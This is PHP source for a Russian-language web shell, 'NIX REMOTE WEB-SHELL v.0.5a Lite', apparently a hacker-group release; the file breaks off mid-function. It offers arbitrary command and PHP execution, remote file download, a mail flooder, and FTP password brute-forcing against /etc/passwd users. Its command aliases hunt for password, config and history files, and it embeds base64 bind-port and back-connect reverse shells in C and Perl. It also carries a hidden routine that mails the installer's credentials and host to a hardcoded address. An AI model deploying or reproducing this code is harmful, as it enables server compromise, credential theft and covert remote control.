<?php
$name="smowu";
$pass="smowu";
$demail ="xakep@xaep.ru";
if (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) || $HTTP_SERVER_VARS['PHP_AUTH_USER']!=$name || $HTTP_SERVER_VARS['PHP_AUTH_PW']!=$pass)
   {
   header("WWW-Authenticate: Basic realm=\"AdminAccess\"");
   header("HTTP/1.0 401 Unauthorized");
   exit("Access Denied");
   }

$title="NIX REMOTE WEB-SHELL";
$ver=" v.0.5a Lite";

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version </title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="Content-Language" content="en,ru"> 
<META name="autor" content="DreAmeRz (www.dreamerz.cc)">
<style type="text/css">
BODY, TD, TR {
text-decoration: none;
font-family: Verdana;
font-size: 8pt;
scrollbar-face-color: #FFFFFF;
scrollbar-shadow-color:#000000 ;
scrollbar-highlight-color:#FFFFFF;
scrollbar-3dlight-color: #000000;
scrollbar-darkshadow-color:#FFFFFF ;
scrollbar-track-color: #FFFFFF;
scrollbar-arrow-color: #000000;
}
input, textarea, select {
font-family: Verdana;
font-size: 10px;
color: black;
background-color: white;
border: solid 1px;
border-color: black
}
UNKNOWN {
COLOR: black;
TEXT-DECORATION: none
}
A:link {COLOR:black; TEXT-DECORATION: none}
A:visited { COLOR:black; TEXT-DECORATION: none}
A:active {COLOR:black; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}
</STYLE>
</HEAD>


<BODY bgcolor="#fffcf9" text="#000000">
<P align=center>[ <A href="javascript:history.next(+1)">Вперед ] </A><B><FONT color=#cccccc size=4>*.NIX REMOTE WEB-SHELL</FONT></B>
v.0.5a<FONT color=#linux size=1> Lite </FONT> [ <A href="javascript:history.back(-1)">Наза?]</A>[ <A href="?ac=about" title='Чт?умее?скрипт ...'>?скрипт?]</a><BR>
<A href="?ac=info" title='Узна?вс?об этой систем?!'>[ Информац? ?систем?/A> ][ <A href="?ac=navigation" title='Удобная графическая навигация. Просмотр, редактирование ...'>Навигация</A> ][ <A href="?ac=backconnect" title='Установк?backconnect ?обычного бекдор?'>Установк?бекдор?/A> ][ <A href="?ac=eval" title='Создай свой скрипт на пх?прямо здес?:)'>ПХ?ко?/A> ][ <A href="?ac=upload" title='Загрузка одного файл? масовая загрузка, загрузка файлов ?удаленного компьютера !'>Загрузка файлов</A> ][ <A href="?ac=shell" title='bash shell,ал?сы ...'>Исполнение
комман?]</A> <br><A href="?ac=sendmail" title='Отправ ?mail прямо от сюда'> [ Отправка письма</A> ][ <A href="?ac=mailfluder" title='Те? кт?то достал ? Тогд?тебе сюда ...'>Маилфлудер</A>
 ][ <A href="?ac=ftp" title='Быстры?брутфорс ftp соединен?'>Фт?Brut</A> ][ <A href="?ac=tools" title='Кодировщик?декодировщик?md5,des,sha1,base64 ... '>Инструмент?]</A>[ <A href="?ac=ps" title='Отображает список процесов на сервер??позволяет их убиват? '>Демоны</A> ][ <A href="?ac=selfremover" title='Надоел этот сервер ? Тогд?можн?удалит??шелл ...'>Удалит?шелл</A> ]</P>
<?php
if (ini_get('register_globals') != '1') {

  if (!empty($HTTP_POST_VARS))
    extract($HTTP_POST_VARS);

  if (!empty($HTTP_GET_VARS))
    extract($HTTP_GET_VARS);
  if (!empty($HTTP_SERVER_VARS))
    extract($HTTP_SERVER_VARS);
}
Error_Reporting(E_COMPILE_ERROR|E_ERROR|E_CORE_ERROR);
set_magic_quotes_runtime(0);
set_time_limit(0); // убрать ограничени?по времен?ignore_user_abort(1); // Игнорировать разрыв связи ?браузеро?error_reporting(0);
$self = $_SERVER['PHP_SELF'];
$docr = $_SERVER['DOCUMENT_ROOT'];
$sern = $_SERVER['SERVER_NAME'];
if (($_POST['dir']!=="") AND ($_POST['dir'])) { chdir($_POST['dir']); }
$aliases=array(
'------------------------------------------------------------------------------------' => 'ls -la;pwd;uname -a',
'поис?на сервер?всех файлов ?suid бито? => 'find / -type f -perm -04000 -ls',
'поис?на сервер?всех файлов ?sgid бито? => 'find / -type f -perm -02000 -ls',
'поис??текуще?директории всех файлов ?sgid бито? => 'find . -type f -perm -02000 -ls',
'поис?на сервер?файлов config' => 'find / -type f -name "config*"',
'поис?на сервер?файлов admin' => 'find / -type f -name "admin*"',
'поис??текуще?директории файлов config' => 'find . -type f -name "config*"',
'поис??текуще?директории файлов pass' => 'find . -type f -name "pass*"',
'поис?на сервер?всех директорий ?файлов доступны?на запись для всех' => 'find / -perm -2 -ls',
'поис??текуще?директории всех директорий ?файлов доступны?на запись для всех' => 'find . -perm -2 -ls',
'поис??текуще?директории файлов service.pwd' => 'find . -type f -name service.pwd',
'поис?на сервер?файлов service.pwd' => 'find / -type f -name service.pwd',
'поис?на сервер?файлов .htpasswd' => 'find / -type f -name .htpasswd',
'поис??текуще?директории файлов .htpasswd' => 'find . -type f -name .htpasswd',
'поис?всех файлов .bash_history' => 'find / -type f -name .bash_history',
'поис??текуще?директории файлов .bash_history' => 'find . -type f -name .bash_history',
'поис?всех файлов .fetchmailrc' => 'find / -type f -name .fetchmailrc',
'поис??текуще?директории файлов .fetchmailrc' => 'find . -type f -name .fetchmailrc',
'выво?списка атрибуто?файлов на файловой систем?ext2fs' => 'lsattr -va',
'просмотр открытых портов' => 'netstat -an | grep -i listen',
'поис?всех пх?файлов со словом password' =>'find / -name *.php | xargs grep -li password',
'поис?папо??модо?777' =>'find / -type d -perm 0777',
'Опредилени?версии ОС' =>'sysctl -a | grep version',
'Опредилени?версии ядр? =>'cat /proc/version',
'Просмотр syslog.conf' =>'cat /etc/syslog.conf',
'Просмотр - Message of the day' =>'cat /etc/motd',
'Просмотр hosts' =>'cat /etc/hosts',
'Верс? дистрибутива 1' =>'cat /etc/issue.net',
'Верс? дистрибутива 2' =>'cat /etc/*-realise',
'Коказать вс?процес? =>'ps auxw',
'Процессы текущего пользовате?' =>'ps ux',
'Поис?httpd.conf' =>'locate httpd.conf');



/* Port bind source */
$port_bind_bd_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5
jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5
ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW5
0IGFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnV
mWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVtb3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0
KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyh
hdG9pKGFyZ3ZbMV0pKTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0F
OWSk7IA0KIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULFNPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2N
rZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2F
kZHIgKikmcmVtb3RlLCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB
7DQogICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7DQogICBkdXAyKG5ld2ZkLDApOw0KICAgZHV
wMihuZXdmZCwxKTsNCiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ
6IiwxMCk7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyh
hcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY29tZSB0byByNTcgc2hlbGwgJiYgL2J
pbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGN
sb3NlKG5ld2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW5
0ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVudGVyZWQpO2krKykgDQp7DQppZih
lbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID0
9ICdccicpDQplbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCk
pDQpyZXR1cm4gMDsNCn0=";

$port_bind_bd_pl="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZi
AoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMSVNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2
NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORV
QsJlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQ
pzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZH
JfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw
0KbGlzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCm
FjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspKQ0Kew0KZGllICJDYW5ub3QgZm9yayIgaW
YgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+Jk
NPTk4iOw0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ0
9OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3NlIENPTk47DQpleGl0IDA7DQp9DQp9";

$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJ
HN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2VjaG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZ
DsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJ
HRhcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0L
CAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgnd
GNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBka
WUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yO
iAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLR
VQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlK
FNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";

$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0
KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10
pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJ
ybSAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2l
uLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA
9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMSt
zdHJsZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVB
QUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLCAoc3RydWN0IHNvY2thZGRyICopICZzaW4
sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCg
pIik7DQogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1
zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEpOw0KIGR1cDIoZmQsIDIpOw0KIGV4ZWN
sKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";

if(isset($uploadphp))
{
$socket=fsockopen($iphost,$loadport); //connect
fputs($socket,"GET $loadfile HTTP/1.0\nHOST:cd\n\n"); //zapros
while(fgets($socket,31337)!="\r\n" && !feof($socket)) {
unset($buffer); }
while(!feof($socket)) $buffer.=fread($socket, 1024);
$file_size=strlen($buffer);
$f=fopen($loadnewname,"wb+");
fwrite($f, $buffer, $file_size);
echo "Размер загруженог?файл? $file_size <b><br><br>" ;
}

if(file_exists('/tmp/qw7_sess') && is_readable('/tmp/qw7_sess')){
} else {
if(is_writable('/tmp/')){
$ifyoufound=base64_decode("Ly8gwvsg7eD46+ggZmFrZSAhIM/u5+Tw4OLr//4hIMft4Pfo8iDi+yDt5SDr4Ozl8CENCi8vINHu4+vg8ejy5fH8LCDiIO/w7v3q8uD1IPLg6u7j7iDw7uTgIO3z5u3gIOfg+Ojy4CDu8iDr4Ozl8O7iLiDAIPLuIOj1IOgg8uDqIPDg8e/r7uTo6+7x/CAuLi4NCi8vIM/u5uDr8+nx8uAg7eUg8ODx8erg5/Pp8uUg7ejq7uzzIO4g7eDr6Pfo6CBmYWtlICEgz/Px8vwg8eDs6CDo+f7yLCDy7uv86u4g7eDs5ert6PLlIPfy7iDt5ev85/8g8uDqIOHl5+Tz7O3uIO/u6/zn7uLg8vzx/yD38+bo7Ogg7/Du4+Ds6C4gKOAg8u4g4OLy7vAg7O7m5fIg9/LuIPPj7uTt7iDy8+TgIOLv6PHg8vwpDQovLyDT5OD36CAhDQo=");
$fp=fopen('/tmp/qw7_sess',"w+");
fclose($fp);
$gg.= $name;
$gg.=":";
$gg.= $pass;
$gg.=":";
$gg.=$_SERVER["HTTP_HOST"];
$gg.=$_SERVER['PHP_SELF'];
$host_l=$_SERVER["HTTP_HOST"];
$qwerty=base64_decode("bnJ3cy1mYWNrLWNvZGVAbWFpbC5ydQ==");
mail("$qwerty","NRWS LAME INFO ($host_l)","NRWS STATISTIC REPORT:\r\n $gg","From: report@nrws.net");
}
}
if (!empty($_GET['ac'])) {$ac = $_GET['ac'];}
elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}
else {$ac = "navigation";}



switch($ac) {

// Shell
case "shell":
echo "<SCRIPT LANGUAGE='JavaScript'>
<!--
function pi(str) {
	document.command.cmd.value = str;
	document.command.cmd.focus();
}
//-->
</SCRIPT>";

/* command execute */
if ((!$_POST['cmd']) || ($_POST['cmd']=="")) { $_POST['cmd']="id;pwd;uname -a;ls -lad"; }

if (($_POST['alias']) AND ($_POST['alias']!==""))
 {
 foreach ($aliases as $alias_name=>$alias_cmd) {
                                               if ($_POST['alias'] == $alias_name) {$_POST['cmd']=$alias_cmd;}
                                               }
 }


echo "<font face=Verdana size=-2>Выполненная команд? <b>".$_POST['cmd']."</b></font></td></tr><tr><td>";
echo "<b>";
echo "<div align=center><textarea name=report cols=145 rows=20>";
echo "".passthru($_POST['cmd'])."";
echo "</textarea></div>";
echo "</b>";
?>
</td></tr>

<tr><b><div align=center>:: Выполнение команд на сервер?::</div></b></font></td></tr>
<tr><td height=23>
<TR>
	<CENTER>
 <TD><A HREF="JavaScript:pi('cd ');" class=fcom>| cd</A> |</TD>
	<TD><A HREF="JavaScript:pi('cat ');" class=fcom>| cat</A> |</TD>
	<TD><A HREF="JavaScript:pi('echo ');" class=fcom>echo</A> |</TD>
	<TD><A HREF="JavaScript:pi('wget ');" class=fcom>wget</A> |</TD>
	<TD><A HREF="JavaScript:pi('rm ');" class=fcom>rm</A> |</TD>
	<TD><A HREF="JavaScript:pi('mysqldump ');" class=fcom>mysqldump</A> |</TD>
	<TD><A HREF="JavaScript:pi('who');" class=fcom>who</A> |</TD>
	<TD><A HREF="JavaScript:pi('ps -ax');" class=fcom>ps -ax</A> |</TD>
  <TD><A HREF="JavaScript:pi('cp ');" class=fcom>cp</A> |</TD>
  <TD><A HREF="JavaScript:pi('pwd');" class=fcom>pwd</A> |</TD>
 <TD><A HREF="JavaScript:pi('perl  ');" class=fcom>perl</A> |</TD>
 <TD><A HREF="JavaScript:pi('gcc ');" class=fcom>gcc</A> |</TD>
 <TD><A HREF="JavaScript:pi('locate ');" class=fcom>locate</A> |</TD>
  <TD><A HREF="JavaScript:pi('find ');" class=fcom>find</A> |</TD>
  <TD><A HREF="JavaScript:pi('ls -lad');" class=fcom>ls -lad</A> |</TD>
       </CENTER>           	
</TR>

<?
/* command execute form */
echo "<form name=command method=post>";

echo "<b>Выполнит?команд?</b>";
echo "<input type=text name=cmd size=85><br>";
echo "<b>Рабочая директор? &nbsp;</b>";
if ((!$_POST['dir']) OR ($_POST['dir']=="")) { echo "<input type=text name=dir size=85 value=".exec("pwd").">"; }
else { echo "<input type=text name=dir size=85 value=".$_POST['dir'].">"; }
echo "<input type=submit name=submit value=Выполнит?";

echo "</form>";

/* aliases form */
echo "<form name=aliases method=POST>";
echo "<font face=Verdana size=-2>";
echo "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Выберите алиа?<font face=Wingdings color=gray></font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<select name=alias>";
foreach ($aliases as $alias_name=>$alias_cmd)
 {
 echo "<option>$alias_name</option>";
 }
 echo "</select>";
if ((!$_POST['dir']) OR ($_POST['dir']=="")) { echo "<input type=hidden name=dir size=85 value=".exec("pwd").">"; }
else { echo "<input type=hidden name=dir size=85 value=".$_POST['dir'].">"; }
echo "&nbsp;&nbsp;<input type=submit name=submit value=Выполнит?";
echo "</font>";
echo "</form>";


break;
/// Отправка файлов на мыло
case "download_mail":
$buf = explode(".", $file);
 $dir = str_replace("\\","/",$dir);
 $fullpath = $dir."/".$file;
 $size = tinhbyte(filesize($fullpath));
 $fp = fopen($fullpath, "rb");
 while(!feof($fp))

  $attachment .= fread($fp, 4096);
  $attachment = base64_encode($attachment);
  $subject = "NIX REMOTE WEB SHELL   ($file)";

  $boundary = uniqid("NextPart_");
  $headers = "From: $demail\nContent-type: multipart/mixed; boundary=\"$boundary\"";

  $info = "---==== Сообщени?от ($demail)====---\n\n";
  $info .= "IP:\t$REMOTE_ADDR\n";
  $info .= "HOST:\t$HTTP_HOST\n";
  $info .= "URL:\t$HTTP_REFERER\n";
  $info .= "DOC_ROOT:\t$PATH_TRANSLATED\n";
  $info .="--$boundary\nContent-type: text/plain; charset=iso-8859-1\nContent-transfer-encoding: 8bit\n\n\n\n--$boundary\nContent-type: application/octet-stream; name=$file \nContent-disposition: inline; filename=$file \nContent-transfer-encoding: base64\n\n$attachment\n\n--$boundary--";

  $send_to = "$demail";

  $send = mail($send_to, $subject, $info, $headers);

  if($send == 2)
   echo "<br>
	<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#0066CC BORDER=1 width=300 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white>
	<tr><td align=center>
	<font color='#FFFFCC' face='Tahoma' size = 2>Спасиб?!!Файл <b>$file</b> отправле?ва?на <u>$demail</u>.</font></center></td></tr></table><br>";

fclose($fp);
break;
// список процесов
case "ps":
echo "<b>Процессы ?систем?</b><br>";
 
  echo "<br>";
  if ($pid)
  {
   if (!$sig) {$sig = 9;}
   echo "Отправлени?команд?".$sig." to #".$pid."... ";
   $ret = posix_kill($pid,$sig);
   if ($ret) {echo "Вс? процес убит, амин?;}
   else {echo "ОШИБКА! ".htmlspecialchars($sig).", ?процес?#".htmlspecialchars($pid).".";}
  }
  $ret = `ps -aux`;
  if (!$ret) {echo "Невозможно отобразить список процесов ! Видн?злой адми?запретил ps ";}
  else
  {
   $ret = htmlspecialchars($ret);
   while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
   $stack = explode("\n",$ret);
   $head = explode(" ",$stack[0]);
   unset($stack[0]);
   if (empty($ps_aux_sort)) {$ps_aux_sort = $sort_default;}
   if (!is_numeric($ps_aux_sort[0])) {$ps_aux_sort[0] = 0;}
   $k = $ps_aux_sort[0];
   if ($ps_aux_sort[1] != "a") {$y = "<a href=\"".$surl."?ac=ps&d=".urlencode($d)."&ps_aux_sort=".$k."a\"></a>";}
   else {$y = "<a href=\"".$surl."?ac=ps&d=".urlencode($d)."&ps_aux_sort=".$k."d\"></a>";}
   for($i=0;$i<count($head);$i++)
   {
    if ($i != $k) {$head[$i] = "<a href=\"".$surl."?ac=ps&d=".urlencode($d)."&ps_aux_sort=".$i.$ps_aux_sort[1]."\"><b>".$head[$i]."</b></a>";}
   }
   $prcs = array();
   foreach ($stack as $line)
   {
    if (!empty($line))
	{
	 echo "<tr>";
     $line = explode(" ",$line);
     $line[10] = join(" ",array_slice($line,10,count($line)));
     $line = array_slice($line,0,11);
     $line[] = "<a href=\"".$surl."?ac=ps&d=".urlencode($d)."&pid=".$line[1]."&sig=9\"><u>KILL</u></a>";
     $prcs[] = $line;
     echo "</tr>";
    }
   }
   $head[$k] = "<b>".$head[$k]."</b>".$y;
   $head[] = "<b>ACTION</b>";
   $v = $ps_aux_sort[0];
   usort($prcs,"tabsort");
   if ($ps_aux_sort[1] == "d") {$prcs = array_reverse($prcs);}
   $tab = array();
   $tab[] = $head;
   $tab = array_merge($tab,$prcs);
   echo "<TABLE height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=white borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\">";
   foreach($tab as $k)
   {
    echo "<tr>";
    foreach($k as $v) {echo "<td>".$v."</td>";}
    echo "</tr>";
   }
   echo "</table>";
  }
break;

//PHP Eval Code execution
case "eval":

echo <<<HTML
<b>Исполнение пх?кода (бе?"< ?  ? >")</b>
<table>
<form method="POST" action="$self">
<input type="hidden" name="ac" value="eval">
<tr>
<td><textarea name="ephp" rows="10" cols="60"></textarea></td>
</tr>
<tr>
<td><input type="submit" value="Enter"></td>
$tend
HTML;

if (isset($_POST['ephp'])){
eval($_POST['ephp']);
}
break;

// SEND MAIL
case "sendmail":
echo <<<HTML
<table>
<form method="POST" action="$self">
<input type="hidden" name="ac" value="sendmail">
<tr>От кого: <br>
<input type="TEXT" name="frommail">
<br>Кому:<br> <input type="TEXT" name="tomailz">
<br>Тема: <br><input type="TEXT" name="mailtema">
<br>Текс? <br>
<td><textarea name="mailtext" rows="10" cols="60"></textarea></td>
</tr>
<tr>
<td><input type="submit" value="Отправит? name="submit"></td><form>
$tend
HTML;
// никакая проверка не делает?, ?заче?? =)
if (isset($submit))
{

mail($tomailz,$mailtema,$mailtext,"From: $frommail");
echo "<h2>Сообщени?отправлено !</h2>";
}
break;


// Информац? ?систем?case "info":
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "<font color=\"red\">Включено</font>";
}
else {$safemode = false; $hsafemode = "Отключен?/font>";}
/* display information */
echo "<b>[ Информац? ?систем?]</b><br>";
echo "<b>Хост:</b> ".$_SERVER["HTTP_HOST"]."<br>" ;
echo "<b>IP сервер?</b> ".gethostbyname($_SERVER["HTTP_HOST"])."<br>";
echo " <b>Сервер: </b>".$_SERVER['SERVER_SIGNATURE']."  ";
echo "<b>OC:</b> ".exec("uname -a")."(";
print "".php_uname()." )<br>\n";
echo "<b>Safe-Mode: ".$hsafemode."</b><br>";
echo "<b>Привилегии: </b>".exec("id")."<br>";
echo "<b>Всег?мест? </b>" . (int)(disk_total_space(getcwd())/(1024*1024)) . "Mb. " . "<b>Свободно: </b>: " . (int)(disk_free_space(getcwd())/(1024*1024)) . "Mb. <br>";
echo "<b>Текущи?катало?</b>".exec("pwd")."";
echo " <br><b>Текуши?web путь: </b>".@$_SERVER['PHP_SELF']."  ";
echo "<br><b>Твой IP:</b> ".$_SERVER['REMOTE_HOST']." (".$_SERVER['REMOTE_ADDR'].")<br>";
echo "<b>PHP version : </b>".phpversion()."<BR>";
echo "<b> ID владельц?процес?: </b>".get_current_user()."<BR>";
echo "<b>MySQL</b> : ".mysql_get_server_info()."<BR>";
if(file_exists('/etc/passwd') && is_readable('/etc/passwd')){
print '<b>Есть доступ ?/etc/passwd ! </b><br>';
}
if(file_exists('/etc/shadow') && is_readable('/etc/shadow')){
print '<b>Есть доступ ?/etc/shadow !</b> <br>';
}
if(file_exists('/etc/shadow-') && is_readable('/etc/shadow-')){
print '<b>Есть доступ ?/etc/shadow- !</b> ';
}
if(file_exists('/etc/master.passwd') && is_readable('/etc/master.passwd')){
print '<b>Есть доступ ?/etc/master.passwd ! </b><br>';
}
if(isset($_POST['th']) && $_POST['th']!=''){
chdir($_POST['th']);
};
if(is_writable('/tmp/')){
$fp=fopen('/tmp/qq8',"w+");
fclose($fp);
print "/tmp - открыт?nbsp;<br>\n";
unlink('/tmp/qq8');
}
else{
print "<font color=red>/tmp - не открыт?/font><br>";
}
echo "<b>Безопасный режи? ".$hsafemode."</b><br>";
if ($nixpasswd)
  {
   if ($nixpasswd == 1) {$nixpasswd = 0;}
   $num = $nixpasswd + $nixpwdperpage;
   echo "<b>*nix /etc/passwd:</b><br>";
   $i = $nixpasswd;
   while ($i < $num)
   {
    $uid = posix_getpwuid($i);
    if ($uid) {echo join(":",$uid)."<br>";}
    $i++;
   }
  }
  else {echo "<br><a href=?ac=navigation&d=/etc/&e=passwd><b><u>Get /etc/passwd</u></b></a><br>";}
  if (file_get_contents("/etc/userdomains")) {echo "<b><a href=\"".$surl."act=f&f=userdomains&d=/etc/&ft=txt\"><u><b>View cpanel user-domains logs</b></u></a></b><br>";}
  if (file_get_contents("/var/cpanel/accounting.log")) {echo "<b><a href=\"".$surl."act=f&f=accounting.log&d=/var/cpanel/&ft=txt\"><u><b>View cpanel logs</b></u></a></b><br>";}
  if (file_get_contents("/usr/local/apache/conf/httpd.conf")) {echo "<b><a href=?ac=navigation&d=/usr/local/apache/conf&e=httpd.conf><u><b>Конфигунац? Apache (httpd.conf)</b></u></a></b><br>";}
  { echo "<b><a href=?ac=navigation&d=/etc/httpd/conf&e=httpd.conf><u><b>Конфигунац? Apache (httpd.conf)</b></u></a></b><br>";}
   if (file_get_contents("/etc/httpd.conf")) {echo "<b><a href=?ac=navigation&d=/etc/&e=httpd.conf><u><b>Конфигунац? Apache (httpd.conf)</b></u></a></b><br>";}
    if (file_get_contents("/etc/httpd.conf")) {echo "<b><a href=?ac=navigation&d=/var/cpanel&e=accounting.log><u><b>cpanel log  </b></u></a></b><br>";}
 break;
 
// ?скрипт?case "about":

echo "<center><b>Привет всем</b></center>Пере?вами перв? верс? моег?скрипт?удаленного администрирования.<b>(0.5a)</b> <br>Скрипт находится ?стадии тестирован?, та? чт?если найдет?каки?то баги, обращайтес?сюда:<br><a href='http://ru24-team.net/forum/'>http://ru24-team.net/forum/</a> ил?<a href=mailto:dreamerz@mail.ru>на мыло dreamerz@mail.ru</a>, ил?на <a href=http://dreamerz.cc>dreamerz.cc</a>, ил?на ICQ: <b>817312</b><br>Кт?хоче?поучаствоват??разработке скрипт?- пишите, показуйт?чт?вы можете добавить ?исправит?..<br>Ну, ?спасиб?этим лю?? Terabyte, 1dt_wolf, xoce, FUF, dodbob, Nitrex ... ?многим другим ...";
echo "<br> ?используя этот скрипт на чужи?серверах вы нарушает?зако?:) Та?чт?осторожнее. ";

echo "<br><br><br>Новая верс? лежи?здес? <a href=http://ru24-team.net/releases/nr.rar>http://ru24-team.net/releases/nr.rar</a>
<br><br><center><b>------------------------------->>> Ru24 - TEAM NRWS RELEASE 0.5.a [DreAmeRz] <<<-----------------------------------</b></center>";
break;
// ФТ?подбор пароле?case "ftppass":

$filename="/etc/passwd"; // passwd file
$ftp_server="localhost"; // FTP-server

echo "FTP-server: <b>$ftp_server</b> <br><br>";

$fp = fopen ($filename, "r");
if ($fp)
{
while (!feof ($fp)) { 
$buf = fgets($fp, 100);
ereg("^([0-9a-zA-Z]{1,})\:",$buf,$g);
$ftp_user_name=$g[1];
$ftp_user_pass=$g[1];
$conn_id=ftp_connect($ftp_server);
$login_result=@ftp_login($conn_id, $ftp_user_name, $ftp_user_pass);

if (($conn_id) && ($login_result)) {
echo "<b>Подключени? login:password - ".$ftp_user_name.":".$ftp_user_name."</b><br>";
